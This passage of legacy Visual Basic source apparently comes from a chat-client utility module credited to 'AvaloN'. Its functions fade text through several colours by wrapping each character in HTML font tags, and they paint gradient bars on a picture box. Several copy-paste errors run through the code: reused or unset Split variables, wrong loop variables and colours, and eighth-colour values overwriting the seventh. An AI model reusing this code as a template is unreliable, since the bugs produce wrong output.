EightColor(3) = b8
NinethColor(1) = R9
NinethColor(2) = G9
NinethColor(3) = B9
TenthColor(1) = R10
TenthColor(2) = G10
TenthColor(3) = B10
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
Split4Num(1) = FifthColor(1) - ForthColor(1)
Split4Num(2) = FifthColor(2) - ForthColor(2)
Split4Num(3) = FifthColor(3) - ForthColor(3)
Split5Num(1) = SixthColor(1) - FifthColor(1)
Split5Num(2) = SixthColor(2) - FifthColor(2)
Split5Num(3) = SixthColor(3) - FifthColor(3)
Split6Num(1) = SeventhColor(1) - SixthColor(1)
Split6Num(2) = SeventhColor(2) - SixthColor(2)
Split6Num(3) = SeventhColor(3) - SixthColor(3)
Split7Num(1) = EightColor(1) - SeventhColor(1)
Split7Num(2) = EightColor(2) - SeventhColor(2)
Split7Num(3) = EightColor(3) - SeventhColor(3)
Split8Num(1) = NinethColor(1) - EightColor(1)
Split8Num(2) = NinethColor(2) - EightColor(2)
Split8Num(3) = NinethColor(3) - EightColor(3)
Split8Num(1) = TenthColor(1) - NinethColor(1)
Split8Num(2) = TenthColor(2) - NinethColor(2)
Split8Num(3) = TenthColor(3) - NinethColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
Divide4Num(1) = Split4Num(1) / 16
Divide4Num(2) = Split4Num(2) / 16
Divide4Num(3) = Split4Num(3) / 16
Divide5Num(1) = Split5Num(1) / 16
Divide5Num(2) = Split5Num(2) / 16
Divide5Num(3) = Split5Num(3) / 16
Divide6Num(1) = Split6Num(1) / 18
Divide6Num(2) = Split6Num(2) / 18
Divide6Num(3) = Split6Num(3) / 18
Divide7Num(1) = Split7Num(1) / 18
Divide7Num(2) = Split7Num(2) / 18
Divide7Num(3) = Split7Num(3) / 18
Divide8Num(1) = Split8Num(1) / 18
Divide8Num(2) = Split8Num(2) / 18
Divide8Num(3) = Split8Num(3) / 18
Divide9Num(1) = Split9Num(1) / 18
Divide9Num(2) = Split9Num(2) / 18
Divide9Num(3) = Split9Num(3) / 18
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 10
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 11 To 21
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 22 To 32
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
For Loo000 = 33 To 43
Picturebox.Line (Loo000 * FadeW - 10, -10)-(9000, 1000), RGB(ForthColor(1), ForthColor(2), ForthColor(3)), BF
ForthColor(1) = ForthColor(1) + Divide4Num(1)
ForthColor(2) = ForthColor(2) + Divide4Num(2)
ForthColor(3) = ForthColor(3) + Divide4Num(3)
Next Loo000
For Loo0000 = 45 To 55
Picturebox.Line (Loo0000 * FadeW - 10, -10)-(9000, 1000), RGB(FifthColor(1), FifthColor(2), FifthColor(3)), BF
FifthColor(1) = FifthColor(1) + Divide5Num(1)
FifthColor(2) = FifthColor(2) + Divide5Num(2)
FifthColor(3) = FifthColor(3) + Divide5Num(3)
Next Loo0000
For Looo0000 = 56 To 66
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
SixthColor(1) = SixthColor(1) + Divide6Num(1)
SixthColor(2) = SixthColor(2) + Divide6Num(2)
SixthColor(3) = SixthColor(3) + Divide6Num(3)
Next Looo0000
For Looo00000 = 67 To 77
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
SeventhColor(1) = SeventhColor(1) + Divide7Num(1)
SeventhColor(2) = SeventhColor(2) + Divide7Num(2)
SeventhColor(3) = SeventhColor(3) + Divide7Num(3)
Next Looo00000
For Looo00000 = 78 To 89
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
EightColor(1) = EightColor(1) + Divide8Num(1)
EightColor(2) = EightColor(2) + Divide8Num(2)
EightColor(3) = EightColor(3) + Divide8Num(3)
Next Looo00000
For Looo000000 = 90 To 100
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
NinethColor(1) = NinethColor(1) + Divide9Num(1)
NinethColor(2) = NinethColor(2) + Divide9Num(2)
NinethColor(3) = NinethColor(3) + Divide9Num(3)
Next Looo000000
End Sub
Public Sub FadeOptions(Bold As Boolean, Underlined As Boolean, StrikeThrew As Boolean, Italic As Boolean)

End Sub
Function FadeByColor9(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, thetext$, WavY As Boolean)
'by AvaloN
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
rednum5% = val("&H" + Right(dacolor5$, 2))
greennum5% = val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = val("&H" + Left(dacolor5$, 2))
rednum6% = val("&H" + Right(dacolor6$, 2))
greennum6% = val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = val("&H" + Left(dacolor6$, 2))
rednum7% = val("&H" + Right(dacolor7$, 2))
greennum7% = val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = val("&H" + Left(dacolor7$, 2))
rednum8% = val("&H" + Right(dacolor8$, 2))
greennum8% = val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = val("&H" + Left(dacolor8$, 2))
rednum9% = val("&H" + Right(dacolor9$, 2))
greennum9% = val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = val("&H" + Left(dacolor9$, 2))
FadeByColor9 = FadeNineColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, thetext, WavY)
End Function
Function FadeNineColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, r7%, g7%, b7%, r8%, g8%, b8%, R9%, G9%, B9%, thetext$, WavY As Boolean)
'by AvaloN
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sevlen% = sevlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Right(thetext, eightlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part4
    TextLen% = Len(part4$)
    For I = 1 To TextLen%
        TextDone$ = Left(part4$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / TextLen% * I) + B4, ((G5 - G4) / TextLen% * I) + G4, ((R5 - R4) / TextLen% * I) + R4)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part5
    TextLen% = Len(part5$)
    For I = 1 To TextLen%
        TextDone$ = Left(part5$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / TextLen% * I) + B5, ((G6 - G5) / TextLen% * I) + G5, ((R6 - R5) / TextLen% * I) + R5)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part6
    TextLen% = Len(part6$)
    For I = 1 To TextLen%
        TextDone$ = Left(part6$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b7 - B6) / TextLen% * I) + B6, ((g7 - G6) / TextLen% * I) + G6, ((r7 - R6) / TextLen% * I) + R6)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part7
    TextLen% = Len(part7$)
    For I = 1 To TextLen%
        TextDone$ = Left(part7$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b8 - b7) / TextLen% * I) + b7, ((g8 - g7) / TextLen% * I) + g7, ((r8 - r7) / TextLen% * I) + r7)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part8
    TextLen% = Len(part8$)
    For I = 1 To TextLen%
        TextDone$ = Left(part8$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - b8) / TextLen% * I) + b8, ((G9 - g8) / TextLen% * I) + g8, ((R9 - r8) / TextLen% * I) + r8)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeNineColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$
End Function
Function FadeByColor8(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, thetext$, WavY As Boolean)
'by AvaloN
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
rednum5% = val("&H" + Right(dacolor5$, 2))
greennum5% = val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = val("&H" + Left(dacolor5$, 2))
rednum6% = val("&H" + Right(dacolor6$, 2))
greennum6% = val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = val("&H" + Left(dacolor6$, 2))
rednum7% = val("&H" + Right(dacolor7$, 2))
greennum7% = val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = val("&H" + Left(dacolor7$, 2))
rednum7% = val("&H" + Right(dacolor8$, 2))
greennum7% = val("&H" + Mid(dacolor8$, 3, 2))
bluenum7% = val("&H" + Left(dacolor8$, 2))
FadeByColor8 = FadeEightColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, thetext, WavY)
End Function
Function FadeEightColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, r7%, g7%, b7%, r8%, g8%, b8%, thetext$, WavY As Boolean)
'by AvaloN
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sevlen% = sevlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Right(thetext, sevlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part4
    TextLen% = Len(part4$)
    For I = 1 To TextLen%
        TextDone$ = Left(part4$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / TextLen% * I) + B4, ((G5 - G4) / TextLen% * I) + G4, ((R5 - R4) / TextLen% * I) + R4)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part5
    TextLen% = Len(part5$)
    For I = 1 To TextLen%
        TextDone$ = Left(part5$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / TextLen% * I) + B5, ((G6 - G5) / TextLen% * I) + G5, ((R6 - R5) / TextLen% * I) + R5)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part6
    TextLen% = Len(part6$)
    For I = 1 To TextLen%
        TextDone$ = Left(part6$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b7 - B6) / TextLen% * I) + B6, ((g7 - G6) / TextLen% * I) + G6, ((r7 - R6) / TextLen% * I) + R6)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part7
    TextLen% = Len(part7$)
    For I = 1 To TextLen%
        TextDone$ = Left(part7$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b8 - b7) / TextLen% * I) + b7, ((g8 - g7) / TextLen% * I) + g7, ((r8 - r7) / TextLen% * I) + r7)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeEightColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$
End Function
Function FadeByColor7(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, thetext$, WavY As Boolean)
'by AvaloN
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
rednum5% = val("&H" + Right(dacolor5$, 2))
greennum5% = val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = val("&H" + Left(dacolor5$, 2))
rednum6% = val("&H" + Right(dacolor6$, 2))
greennum6% = val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = val("&H" + Left(dacolor6$, 2))
rednum7% = val("&H" + Right(dacolor7$, 2))
greennum7% = val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = val("&H" + Left(dacolor7$, 2))
FadeByColor7 = FadeSevenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, thetext, WavY)
End Function
Function FadeSevenColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, r7%, g7%, b7%, thetext$, WavY As Boolean)
'by AvaloN
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Right(thetext, sixlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
